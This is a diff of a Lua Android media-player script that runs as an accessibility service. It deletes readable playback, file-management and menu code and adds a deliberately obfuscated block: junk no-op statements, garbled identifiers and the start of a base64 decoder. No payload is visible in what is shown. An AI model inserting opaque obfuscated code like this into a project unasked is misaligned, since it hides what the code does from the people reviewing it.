-                    local confSingleDel = AlertDialog.Builder(service)
-                    confSingleDel.setTitle("Delete Item?")
-                    
-                    local msg = "Are you sure you want to permanently delete: " .. targetMedia.name .. "?"
-                    if targetMedia.isDir then
-                        local totalSize = getFolderSizeRecursive(File(targetMedia.path))
-                        local sizeStr = formatSize(totalSize)
-                        msg = "Do you want to delete this folder: " .. targetMedia.name .. " (" .. sizeStr .. ")?"
-                    end
-                    confSingleDel.setMessage(msg)
-                    
-                    confSingleDel.setPositiveButton("Delete", function()
-                        showToast("Deleting...")
-                        Thread(Runnable({
-                            run = function()
-                                local targetFile = File(targetMedia.path)
-                                local deleted = false
-                                if targetMedia.isDir then
-                                    deleted = deleteFolderRecursive(targetFile)
-                                else
-                                    deleted = targetFile.delete()
-                                end
-                                
-                                Handler(Looper.getMainLooper()).post(Runnable({
-                                    run = function()
-                                        if deleted then
-                                            showToast("Deleted successfully.")
-                                            if currentFilePath == targetMedia.path then
-                                                player.reset() cancelNotification()
-                                                currentFilePath = "" lastPlayedPosition = 0 saveState()
-                                                if controlsDialog then controlsDialog.dismiss() controlsDialog = nil end
-                                            end
-                                            mediaListDialog.dismiss()
-                                            renderMediaList(currentPath, mediaType)
-                                        else
-                                            showToast("Failed to delete.")
-                                        end
-                                    end
-                                }))
-                            end
-                        })).start()
-                    end)
-                    confSingleDel.setNegativeButton("Cancel", nil)
-                    showDialogSafe(confSingleDel)
-                end
-            end
-            return true
-        end
-    }))
-
-    local backFunc = function()
-        if isMultiSelectActive then
-            isMultiSelectActive = false
-            selectedItemsMap = {}
-            if bottomBar then bottomBar.setVisibility(View.GONE) end
-            updateListAndButtons()
-        else
-            mediaListDialog.dismiss()
-            
-            local pathStr = tostring(currentPath)
-            if pathStr:find("WhatsApp/Media") then
-                local name = File(currentPath).getName()
-                if name == "WhatsApp Audio" or name == "WhatsApp Voice Notes" or name == "WhatsApp Video" or name == ".Statuses" then
-                    showWhatsAppMenu()
-                    return
-                end
-            end
-            
-            if currentBrowseMode == "all_files" or currentBrowseMode == "favorites" then
-                local baseStorage = "/storage/emulated/0"
-                local sdPath = getExternalSdCardPath()
-                if sdPath and pathStr:sub(1, #sdPath) == sdPath then baseStorage = sdPath end
-                showBrowseModeMenu(baseStorage, mediaType)
-            else
-                local sdPath = getExternalSdCardPath()
-                if currentPath == "/storage/emulated/0" or (sdPath and currentPath == sdPath) then
-                    local baseStorage = "/storage/emulated/0"
-                    if sdPath and pathStr:sub(1, #sdPath) == sdPath then baseStorage = sdPath end
-                    showBrowseModeMenu(baseStorage, mediaType)
-                else
-                    local parentDir = File(currentPath).getParent()
-                    if parentDir and parentDir ~= "/storage" and parentDir ~= "/storage/emulated" then
-                        renderMediaList(parentDir, mediaType)
-                    else
-                        local baseStorage = "/storage/emulated/0"
-                        if sdPath and pathStr:sub(1, #sdPath) == sdPath then baseStorage = sdPath end
-                        showBrowseModeMenu(baseStorage, mediaType)
-                    end
-                end
-            end
-        end
-    end
-    
-    builder.setNegativeButton("Back", backFunc)
-    
-    Handler(Looper.getMainLooper()).post(Runnable({
-        run = function()
-            mediaListDialog = builder.create()
-            mediaListDialog.getWindow().setType(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
-            import "android.view.KeyEvent"
-            mediaListDialog.setOnKeyListener(DialogInterface.OnKeyListener({
-                onKey = function(d, keyCode, event)
-                    if keyCode == KeyEvent.KEYCODE_BACK and event.getAction() == KeyEvent.ACTION_UP then
-                        backFunc()
-                        return true
-                    end
-                    return false
-                end
-            }))
-            mediaListDialog.show()
-        end
-    }))
-end
-
--- 7. Media Playback Function
-playMedia = function(filePath, forcePlay)
-    currentFilePath = filePath
-    saveState()
-    
-    for i, path in ipairs(currentPlaylist) do
-        if path == filePath then
-            currentIndex = i
-            break
-        end
-    end
-    
-    local shouldStart = false
-    if forcePlay ~= nil then
-        shouldStart = forcePlay
-    else
-        pcall(function() shouldStart = player.isPlaying() end)
-    end
-
-    local success, err = pcall(function()
-        player.reset()
-        player.setDataSource(filePath)
-        player.prepare()
-        _G.smart_player_is_prepared = true
-        _G.smart_player_current_path = filePath
-        
-        if currentSurfaceHolder then
-            pcall(function() player.setDisplay(currentSurfaceHolder) end)
-        end
-        
-        loudnessEnhancer = LoudnessEnhancer(player.getAudioSessionId())
-        applyVolumeBoost(true)
-        
-        player.setOnCompletionListener(MediaPlayer.OnCompletionListener({
-            onCompletion = function(mp)
-                if autoPlay == "on" then
-                    if currentIndex < #currentPlaylist then
-                        currentIndex = currentIndex + 1
-                        lastPlayedPosition = 0
-                        playMedia(currentPlaylist[currentIndex], true)
-                    else
-                        cancelNotification()
-                        if btnPlayPauseRef then btnPlayPauseRef.setText("Play") end
-                    end
-                else
-                    cancelNotification()
-                    if btnPlayPauseRef then btnPlayPauseRef.setText("Play") end
-                end
-            end
-        }))
-        
-        if lastPlayedPosition > 0 then player.seekTo(lastPlayedPosition) end
-        
-        if shouldStart then
-            player.start()
-            applyPlaybackSpeed()
-            if btnPlayPauseRef then btnPlayPauseRef.setText("Pause") end
-            if backgroundPlay == "on" then showNotification(File(filePath).getName()) end
-        else
-            if btnPlayPauseRef then btnPlayPauseRef.setText("Play") end
-            cancelNotification()
-        end
-    end)
-    if not success then showToast("Playback Error.") end
-    showPlayerControls()
-end
-
--- 8. Custom Player Window
-showPlayerControls = function()
-    -- Dynamic Playlist Rebuild from saved folder state on wake up / resume
-    if #currentPlaylist == 0 and currentSavedFolder and currentSavedFolder ~= "" then
-        rebuildPlaylistFromFolder(currentSavedFolder, currentSavedMediaType)
-    end
-
-    if controlsDialog and controlsDialog.isShowing() then
-        if txtTitleRef then txtTitleRef.setText(File(currentFilePath).getName()) end
-        if btnFavoriteRef then
-            if isFavorite(currentFilePath) then
-                btnFavoriteRef.setText("Remove from Favorite")
-            else
-                btnFavoriteRef.setText("Add to Favorite")
-            end
-        end
-        return
-    end
-    Handler(Looper.getMainLooper()).post(Runnable({
-        run = function()
-            local context = service
-            local scrollView = ScrollView(context)
-            local layout = LinearLayout(context)
-            layout.setOrientation(LinearLayout.VERTICAL)
-            layout.setPadding(45, 45, 45, 45)
-
-            txtTitleRef = TextView(context)
-            txtTitleRef.setText(File(currentFilePath).getName())
-            txtTitleRef.setTextSize(18)
-            txtTitleRef.setGravity(Gravity.CENTER)
-            txtTitleRef.setPadding(0, 10, 0, 15)
-            layout.addView(txtTitleRef)
-
-            txtTimeRef = TextView(context)
-            txtTimeRef.setText("00:00 / 00:00")
-            txtTimeRef.setTextSize(15)
-            txtTimeRef.setGravity(Gravity.CENTER)
-            txtTimeRef.setPadding(0, 0, 0, 15)
-            layout.addView(txtTimeRef)
-
-            if currentSavedMediaType == "video" or currentSavedMediaType == "statuses" then
-                local surfaceView = SurfaceView(context)
-                surfaceView.setKeepScreenOn(true)
-                local lp = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 550)
-                lp.setMargins(0, 10, 0, 15)
-                surfaceView.setLayoutParams(lp)
-                layout.addView(surfaceView)
-                
-                local holder = surfaceView.getHolder()
-                holder.addCallback(SurfaceHolder.Callback({
-                    surfaceCreated = function(h)
-                        currentSurfaceHolder = h
-                        pcall(function() player.setDisplay(h) end)
-                    end,
-                    surfaceChanged = function(h, format, width, height) end,
-                    surfaceDestroyed = function(h)
-                        currentSurfaceHolder = nil
-                        pcall(function() player.setDisplay(nil) end)
-                    end
-                }))
-            end
-
-            seekBarRef = SeekBar(context)
-            layout.addView(seekBarRef)
-            seekBarRef.setOnSeekBarChangeListener(SeekBar.OnSeekBarChangeListener({
-                onProgressChanged = function(sBar, progress, fromUser)
-                    if fromUser then player.seekTo(math.floor(progress)) saveState() end
-                end,
-                onStartTrackingTouch = function(sBar) end,
-                onStopTrackingTouch = function(sBar) end
-            }))
-
-            local spaceBeforeRow = TextView(context)
-            spaceBeforeRow.setPadding(0, 0, 0, 10)
-            layout.addView(spaceBeforeRow)
-
-            local rowBoostSleep = LinearLayout(context)
-            rowBoostSleep.setOrientation(LinearLayout.HORIZONTAL)
-            rowBoostSleep.setGravity(Gravity.CENTER)
-            
-            local hasSleepBtn = (showSleepTimerToggle == "on")
-            local hasBoostBtn = (showVolumeBoostToggle == "on")
-
-            if hasSleepBtn then
-                btnSleepToggleRef = Button(context)
-                btnSleepToggleRef.setText("Sleep Mode: " .. sleepModeActive:upper())
-                local lpSleep = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0)
-                btnSleepToggleRef.setLayoutParams(lpSleep)
-                btnSleepToggleRef.setOnClickListener(View.OnClickListener({
-                    onClick = function(v)
-                        if sleepModeActive == "on" then
-                            sleepModeActive = "off"
-                            if sleepRunnable then sleepHandler.removeCallbacks(sleepRunnable) end
-                            btnSleepToggleRef.setText("Sleep Mode: OFF")
-                            showToast("Sleep timer off")
-                        else
-                            sleepModeActive = "on"
-                            btnSleepToggleRef.setText("Sleep Mode: ON")
-                            if sleepDurationMs and sleepDurationMs > 0 then
-                                if sleepRunnable then sleepHandler.removeCallbacks(sleepRunnable) end
-                                sleepRunnable = Runnable({
-                                    run = function()
-                                        pcall(function()
-                                            if player and player.isPlaying() then player.pause() end
-                                            if player then lastPlayedPosition = player.getCurrentPosition() end
-                                            _G.smart_player_is_prepared = true
-                                            _G.smart_player_minimized = false
-                                            saveState()
-                                            cancelNotification()
-                                            if controlsDialog then controlsDialog.dismiss() controlsDialog = nil end
-                                        end)
-                                    end
-                                })
-                                sleepHandler.postDelayed(sleepRunnable, sleepDurationMs)
-                                local totalSecs = math.floor(sleepDurationMs / 1000)
-                                showToast("Sleep timer on for " .. totalSecs .. " seconds")
-                            else
-                                showToast("Sleep timer on")
-                            end
-                        end
-                    end
-                }))
-                rowBoostSleep.addView(btnSleepToggleRef)
-            end
-
-            if hasBoostBtn then
-                btnVolumeBoostRef = Button(context)
-                local bLabels = {"Normal", "1.5x", "2.0x", "3.0x"}
-                btnVolumeBoostRef.setText("Volume Boost: " .. bLabels[currentBoostStage])
-                local lpBoost = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0)
-                btnVolumeBoostRef.setLayoutParams(lpBoost)
-                btnVolumeBoostRef.setOnClickListener(View.OnClickListener({
-                    onClick = function(v)
-                        currentBoostStage = currentBoostStage + 1
-                        if currentBoostStage > 4 then currentBoostStage = 1 end
-                        applyVolumeBoost()
-                    end
-                }))
-                rowBoostSleep.addView(btnVolumeBoostRef)
-            end
-
-            if hasSleepBtn or hasBoostBtn then
-                layout.addView(rowBoostSleep)
-            end
-
-            local spacer = TextView(context)
-            spacer.setPadding(0, 0, 0, 20)
-            layout.addView(spacer)
-
-            local btnPrev = Button(context)
-            btnPrev.setText("Previous")
-            btnPrev.setOnClickListener(View.OnClickListener({
-                onClick = function(v)
-                    if currentIndex > 1 then
-                        currentIndex = currentIndex - 1
-                        lastPlayedPosition = 0
-                        playMedia(currentPlaylist[currentIndex], true)
-                    else showToast("First file.") end
-                end
-            }))
-            layout.addView(btnPrev)
-
-            local btnRewind = Button(context)
-            btnRewind.setText("Rewind <<")
-            btnRewind.setOnClickListener(View.OnClickListener({
-                onClick = function(v)
-                    local currentPos = player.getCurrentPosition()
-                    local targetPos = math.floor(currentPos - ffRwDuration)
-                    if targetPos < 0 then targetPos = 0 end
-                    player.seekTo(targetPos)
-                    saveState()
-                end
-            }))
-            layout.addView(btnRewind)
-
-            local btnPlayPause = Button(context)
-            btnPlayPauseRef = btnPlayPause
-            local isPlaying = false
-            pcall(function() isPlaying = player.isPlaying() end)
-            btnPlayPause.setText(isPlaying and "Pause" or "Play")
-            
-            btnPlayPause.setOnClickListener(View.OnClickListener({
-                onClick = function(v)
-                    if player and player.isPlaying() then
-                        player.pause() 
-                        saveState() 
-                        btnPlayPause.setText("Play")
-                        if backgroundPlay == "on" then showNotification(File(currentFilePath).getName()) end
-                    else
-                        player.start()
-                        applyPlaybackSpeed()
-                        btnPlayPause.setText("Pause")
-                        if backgroundPlay == "on" then showNotification(File(currentFilePath).getName()) end
-                    end
-                end
-            }))
-            layout.addView(btnPlayPause)
-
-            local btnFF = Button(context)
-            btnFF.setText("Fast Forward >>")
-            btnFF.setOnClickListener(View.OnClickListener({
-                onClick = function(v)
-                    local currentPos = player.getCurrentPosition()
-                    local totalDur = player.getDuration()
-                    local targetPos = math.floor(currentPos + ffRwDuration)
-                    if targetPos > totalDur then targetPos = totalDur - 1000 end
-                    player.seekTo(targetPos)
-                    saveState()
-                end
-            }))
-            layout.addView(btnFF)
-
-            local btnNext = Button(context)
-            btnNext.setText("Next")
-            btnNext.setOnClickListener(View.OnClickListener({
-                onClick = function(v)
-                    if currentIndex < #currentPlaylist then
-                        currentIndex = currentIndex + 1
-                        lastPlayedPosition = 0
-                        playMedia(currentPlaylist[currentIndex], true)
-                    else showToast("Last file.") end
-                end
-            }))
-            layout.addView(btnNext)
-
-            local btnMore = Button(context)
-            btnMore.setText("More Options")
-            btnMore.setOnClickListener(View.OnClickListener({
-                onClick = function(v) showMoreOptions() end
-            }))
-            layout.addView(btnMore)
-
-            local btnFavorite = Button(context)
-            btnFavoriteRef = btnFavorite
-            local function updateFavoriteButtonText()
-                if isFavorite(currentFilePath) then
-                    btnFavorite.setText("Remove from Favorite")
-                else
-                    btnFavorite.setText("Add to Favorite")
-                end
-            end
-            updateFavoriteButtonText()
-            btnFavorite.setOnClickListener(View.OnClickListener({
-                onClick = function(v)
-                    toggleFavorite(currentFilePath)
-                    updateFavoriteButtonText()
-                end
-            }))
-            layout.addView(btnFavorite)
-
-            local btnFolder = Button(context)
-            btnFolder.setText("Choose Your Folder")
-            btnFolder.setOnClickListener(View.OnClickListener({
-                onClick = function(v)
-                    saveState()
-                    if controlsDialog then controlsDialog.dismiss() controlsDialog = nil end
-                    isMultiSelectActive = false
-                    selectedItemsMap = {}
-                    showStorageMenu()
-                end
-            }))
-            layout.addView(btnFolder)
-
-            local btnMinimize = Button(context)
-            btnMinimize.setText("Minimize Player")
-            btnMinimize.setOnClickListener(View.OnClickListener({
-                onClick = function(v)
-                    saveState()
-                    if controlsDialog then controlsDialog.dismiss() controlsDialog = nil end
-                    _G.smart_player_minimized = true
-                    if backgroundPlay == "on" then
-                        showNotification(File(currentFilePath).getName())
-                    else
-                        pcall(function() 
-                            if player.isPlaying() then player.pause() end 
-                            lastPlayedPosition = player.getCurrentPosition() 
-                        end)
-                        _G.smart_player_is_prepared = true
-                        saveState() cancelNotification()
-                    end
-                end
-            }))
-            layout.addView(btnMinimize)
-
-            local btnExit = Button(context)
-            btnExit.setText("Exit")
-            btnExit.setOnClickListener(View.OnClickListener({
-                onClick = function(v)
-                    pcall(function() player.reset() end)
-                    currentFilePath = ""
-                    lastPlayedPosition = 0
-                    currentSavedFolder = "" 
-                    _G.smart_player_is_prepared = false
-                    _G.smart_player_current_path = ""
-                    _G.smart_player_minimized = false
-                    saveState()
-                    cancelNotification()
-                    if controlsDialog then controlsDialog.dismiss() controlsDialog = nil end
-                end
-            }))
-            layout.addView(btnExit)
-
-            scrollView.addView(layout)
-            local builder = AlertDialog.Builder(context)
-            builder.setView(scrollView)
-            controlsDialog = builder.create()
-            controlsDialog.getWindow().setType(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
-            
-            if currentSavedMediaType == "video" or currentSavedMediaType == "statuses" then
-                controlsDialog.getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
-            end
-            
-            import "android.view.KeyEvent"
-            controlsDialog.setOnKeyListener(DialogInterface.OnKeyListener({
-                onKey = function(dialog, keyCode, event)
-                    if keyCode == KeyEvent.KEYCODE_BACK and event.getAction() == KeyEvent.ACTION_UP then
-                        controlsDialog.dismiss()
-                        controlsDialog = nil
-                        saveState()
-                        
-                        if currentSavedFolder and currentSavedFolder ~= "" then
-                            isMultiSelectActive = false
-                            selectedItemsMap = {}
-                            renderMediaList(currentSavedFolder, currentSavedMediaType)
-                        else
-                            _G.smart_player_minimized = true
-                            if backgroundPlay == "on" then
-                                showNotification(File(currentFilePath).getName())
-                            else
-                                pcall(function() 
-                                    if player.isPlaying() then player.pause() end 
-                                    lastPlayedPosition = player.getCurrentPosition() 
-                        end)
-                                _G.smart_player_is_prepared = true
-                                saveState() cancelNotification()
-                            end
-                        end
-                        return true
-                    end
-                    return false
-                end
-            }))
-            
-            controlsDialog.show()
-            startSeekBarUpdate()
-        end
-    }))
-end
-
--- 9. Optimized SeekBar & Text Sync Thread
-local isUpdating = false
-startSeekBarUpdate = function()
-    if isUpdating then return end
-    isUpdating = true
-    local handler = Handler(Looper.getMainLooper())
-    local updateRunnable
-    local cycleCount = 0
-    updateRunnable = Runnable({
-        run = function()
-            if controlsDialog and controlsDialog.isShowing() and player then
-                local isPlaying = false
-                local current = 0
-                local total = 0
-                
-                local ok = pcall(function()
-                    isPlaying = player.isPlaying()
-                    current = player.getCurrentPosition()
-                    total = player.getDuration()
-                end)
-
-                if ok and total > 0 then
-                    if btnPlayPauseRef then
-                        local expectedText = isPlaying and "Pause" or "Play"
-                        if tostring(btnPlayPauseRef.getText()) ~= expectedText then
-                            btnPlayPauseRef.setText(expectedText)
-                        end
-                    end
-                    seekBarRef.setMax(total)
-                    seekBarRef.setProgress(current)
-                    
-                    if isPlaying then
-                        lastPlayedPosition = current
-                    end
-                    
-                    local curSec = math.floor(current / 1000)
-                    local curMin = math.floor(curSec / 60)
-                    curSec = curSec % 60
-                    
-                    local totSec = math.floor(total / 1000)
-                    local totMin = math.floor(totSec / 60)
-                    totSec = totSec % 60
-                    
-                    txtTimeRef.setText(string.format("%02d:%02d / %02d:%02d", curMin, curSec, totMin, totSec))
-                    cycleCount = cycleCount + 1
-                    if cycleCount >= 5 then cycleCount = 0 saveState() end
-                else
-                    if btnPlayPauseRef then
-                        local expectedText = isPlaying and "Pause" or "Play"
-                        if tostring(btnPlayPauseRef.getText()) ~= expectedText then
-                            btnPlayPauseRef.setText(expectedText)
-                        end
-                    end
-                    txtTimeRef.setText("00:00 / 00:00")
-                end
-                handler.postDelayed(updateRunnable, 1000)
-            else isUpdating = false end
-        end
-    })
-    handler.post(updateRunnable)
-end
-
--- 10. More Options Menu
-showMoreOptions = function()
-    local file = File(currentFilePath)
-    local options = {"Delete", "Share", "Playback Speed", "Rename"}
-    if currentSavedMediaType == "statuses" then
-        table.insert(options, 1, "Save to Gallery")
-    end
-    local builder = AlertDialog.Builder(service)
-    builder.setItems(options, function(dialog, which)
-        local idx = which + 1
-        local selectedOpt = options[idx]
-        
-        if selectedOpt == "Save to Gallery" then
-            saveStatusToGallery(currentFilePath)
-        elseif selectedOpt == "Delete" then
-            local confDel = AlertDialog.Builder(service)
-            confDel.setTitle("Delete File?")
-            confDel.setMessage("Are you sure you want to permanently delete this file?")
-            confDel.setPositiveButton("Delete", function()
-                local f = File(currentFilePath)
-                if f.delete() then
-                    showToast("Deleted successfully.")
-                    player.reset()
-                    cancelNotification()
-                    _G.smart_player_is_prepared = false
-                    _G.smart_player_current_path = ""
-                    currentFilePath = ""
-                    lastPlayedPosition = 0
-                    saveState()
-                    if controlsDialog then controlsDialog.dismiss() controlsDialog = nil end
-                    renderMediaList(currentSavedFolder, currentSavedMediaType)
-                else
-                    showToast("Failed to delete.")
-                end
-            end)
-            confDel.setNegativeButton("Cancel", nil)
-            showDialogSafe(confDel)
-        elseif selectedOpt == "Share" then
-            if controlsDialog then controlsDialog.dismiss() controlsDialog = nil end
-            
-            local originalPackage = ""
-            pcall(function()
-                local root = service.getRootInActiveWindow()
-                if root then originalPackage = tostring(root.getPackageName()) end
-            end)
-            if originalPackage == "" or originalPackage == "android" or originalPackage == "com.android.intentresolver" then
-                originalPackage = "com.android.launcher3"
-            end
-            
-            pcall(function()
-                local context = service
-                setStrictModeAllowFileUri()
-                local shareUri = Uri.fromFile(File(currentFilePath))
-                local intent = Intent(Intent.ACTION_SEND)
-                intent.setType("*/*")
-                intent.putExtra(Intent.EXTRA_STREAM, shareUri)
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
-                local chooser = Intent.createChooser(intent, "Share File")
-                chooser.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                context.startActivity(chooser)
-            end)
-            
-            local monitorHandler = Handler(Looper.getMainLooper())
-            local monitorRunnable
-            local loopCount = 0
-            local hasLeftApp = false
-            
-            monitorRunnable = Runnable({
-                run = function()
-                    loopCount = loopCount + 1
-                    local currentPkg = ""
-                    pcall(function()
-                        local root = service.getRootInActiveWindow()
-                        if root then currentPkg = tostring(root.getPackageName()) end
-                    end)
-                    local currentPkgLower = currentPkg:lower()
-                    
-                    if currentPkg ~= "" and currentPkg ~= originalPackage and not currentPkgLower:find("launcher") and not currentPkgLower:find("home") then
-                        hasLeftApp = true
-                    end
-                    
-                    if hasLeftApp and (currentPkg == originalPackage or currentPkgLower:find("launcher") or currentPkgLower:find("home")) then
-                        Handler(Looper.getMainLooper()).post(Runnable({
-                            run = function() 
-                                showPlayerControls()
-                            end
-                        }))
-                    elseif not hasLeftApp and loopCount > 10 then
-                        Handler(Looper.getMainLooper()).post(Runnable({
-                            run = function()
-                                showPlayerControls()
-                            end
-                        }))
-                    elseif loopCount < 120 then
-                        monitorHandler.postDelayed(monitorRunnable, 1000)
-                    end
-                end
-            })
-            monitorHandler.postDelayed(monitorRunnable, 1000)
-            
-        elseif selectedOpt == "Playback Speed" then
-            showPlaybackSpeedMenu("player")
-        elseif selectedOpt == "Rename" then
-            Handler(Looper.getMainLooper()).post(Runnable({
-                run = function()
-                    local f = File(currentFilePath)
-                    local oldFullName = f.getName()
-                    
-                    -- Extract filename and extension accurately
-                    local displayName = oldFullName
-                    local extension = ""
-                    local dotIndex = oldFullName:match("^.*()%.")
-                    if dotIndex then
-                        displayName = oldFullName:sub(1, dotIndex - 1)
-                        extension = oldFullName:sub(dotIndex) -- includes the dot
-                    end
-                    
-                    local inputField = EditText(service)
-                    inputField.setText(displayName) -- Show clean name without extension
-                    inputField.setSelectAllOnFocus(true)
-                    inputField.setOnClickListener(View.OnClickListener({
-                        onClick = function(v)
-                            inputField.setText("")
-                        end
-                    }))
-                    
-                    local renBuilder = AlertDialog.Builder(service)
-                    renBuilder.setTitle("Rename File")
-                    renBuilder.setView(inputField)
-                    renBuilder.setPositiveButton("Rename", function()
-                        local userInput = tostring(inputField.getText())
-                        if userInput ~= "" and userInput ~= displayName then
-                            -- Automatically attach the cached hidden extension
-                            local newFullName = userInput .. extension
-                            local parent = f.getParentFile()
-                            local newFile = File(parent, newFullName)
-                            if f.renameTo(newFile) then
-                                showToast("Renamed successfully.")
-                                currentFilePath = newFile.getAbsolutePath()
-                                _G.smart_player_current_path = currentFilePath
-                                saveState()
-                                
-                                -- Refresh the dynamic playlist in memory to reflect new file name
-                                if currentSavedFolder and currentSavedFolder ~= "" then
-                                    rebuildPlaylistFromFolder(currentSavedFolder, currentSavedMediaType)
-                                end
-                                
-                                if txtTitleRef then txtTitleRef.setText(newFullName) end
-                            else
-                                showToast("Rename failed.")
-                            end
-                        end
-                    end)
-                    renBuilder.setNegativeButton("Cancel", nil)
-                    showDialogSafe(renBuilder)
-                end
-            }))
-        end
-    end)
-    builder.setNegativeButton("Cancel", nil)
-    showDialogSafe(builder)
-end
-
--- Initialization Engine Execution
-loadState()
-loadFavorites()
-
-if currentFilePath and currentFilePath ~= "" and _G.smart_player_is_prepared and _G.smart_player_minimized then
-    showPlayerControls()
-else
-    showMainMenu()
-end
+if _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx then IIGHIJKLMNOI_XYZabcdefghi1=10 end
+do I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno=I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno or 486 end
+do I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno=I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno or 52 end
+do _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=_1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx or 847 end
+for _=2,2 do end
+pcall(function()end)
+do IIGHIJKLMNOI_XYZabcdefghi1=_1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_ or 728 end
+for _=4,2 do end
+do local _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=241 end
+while false do break end
+repeat until true
+do _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=76 end
+do local _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=702 end
+do local _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=234 end
+do local _=34 end
+repeat until true
+for _=3,2 do end
+if I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno then LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ=67 end
+do LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ=72 end
+local O0_CDEFGHIJKLMNOPQRSTUVWXYZabcdefoXYZabcdefghijklmnopqrstuYZabcdefgRSTUVWXYZabc,GHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrTUVWXYZabcdefghijklmnVWXYZabZabcdefghiRSHIJKLMNOPQRSTUVWXYZ_LMNOPQRSTUVWXYZabcdefg,FGHIJKLMNOPQRSTUVWXYZabcdefghijuvwxyz_UVWXYZabcdefghijklmopqrstuvwxy1DEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrs,_1_ABCDEFGHIJKLMNOPQR=string,math,table,bit32
+local MNOPQR_NOPQRSJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,IJKLMNOPQRSTUVWXYZaJKLMNOPQRSTUVWXYZabcdefghijklmnopqrTUVWXYZabcdefghijklmnopqrstuvwxyz_OBCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnoUVWXYZabcdefghijklmnopqrstHIJKLMNOPQRSTUVWXYZabcdefghijklLMNOPQRSTUVWXYZabcdefghijklmnop,ZabcdefjklmnopqrsOhijklmnopqrstuvwxyz_,O0fghijklmnopqrstuvlmnopqrHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr1TUVWXYZabcdefghijklmnopqrs1,NOPQRSuvwxyzTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnRSTUVWXYZabcd
+pcall(function()end)
+for _=4,3 do end
+pcall(function()end)
+do IIGHIJKLMNOI_XYZabcdefghi1=_1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_ or 53 end
+do IIGHIJKLMNOI_XYZabcdefghi1=LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ or 653 end
+do local _={92,38}end
+do local LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ=343 end
+pcall(function()end)
+if _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_ then _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=84 end
+do local _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=323 end
+local function TUVWXYZabcdefghijklmnopqrstuvwxyz_RSTUVUVWXYZabcdefghijklmnopqrs_MNOPQOPQRSTUVWXYZabcdefghijklmnop0(d)
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
